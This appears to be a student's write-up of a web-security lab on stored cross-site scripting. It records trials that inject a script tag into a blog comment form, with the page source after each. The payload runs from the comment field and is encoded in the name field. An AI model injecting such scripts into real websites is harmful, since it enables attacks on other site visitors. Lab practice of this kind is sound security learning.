# Stored XSS into HTML context with nothing encoded 

**Notes:**
 **Analysis**

There are 4 fileds in comment section
Comment, name, email, website
  

***Trial 1***

1. Comment : hello from hecker

2. Name : hecker

3. Email : hecker@web.com

4. Website : -blank-

  

**Observation** : *Testing*

*On looking at the view-page source, so, we can try injecting JS to "Comment field" or "name field ???"*

  

    <section  class="comment">
    <p>
    <img  src="/resources/images/avatarDefault.svg"  class="avatar"> 
    hecker | 11 January 2022
    </p>
    
    <p>hello from hecker</p>
    <p></p>
    </section>

  
***Trial 2 : Injecting JS to Comment field***

1. Comment : <script>alert('hello from hecker')</script>

2. Name : hecker2

3. Email : hecker@web.com

4. Website : <blank>

  
**Observation : *Sucess***

*On looking at the code, we are able to inject JS sucessfully and get the pop-up box*

    <section  class="comment">
    
    <p>
    
    <img  src="/resources/images/avatarDefault.svg"  class="avatar"> 
    hecker2 | 11 January 2022
    
    </p>
    
    <p><script>alert('hello from hecker')</script></p>
    
    <p></p>
    
    </section>


**Trial 3 : Injecting JS to Name field**

1. Comment : hello from hecker

2. Name : <script>alert('hecker3')</script>

3. Email : hecker@web.com

4. Website : <blank>

**Observation : Failure**

*On looking at the code, we see angle brackets(<,>) are HTML encoded.*


    <section  class="comment">
    
    <p>
    
    <img  src="/resources/images/avatarDefault.svg"  class="avatar">
    
    &lt;script&gt;alert(&apos;hecker3&apos;)&lt;/script&gt; | 11 January 2022
    
    </p>
    
    <p>hello from hecker</p>
    
    <p></p>
    
    </section>
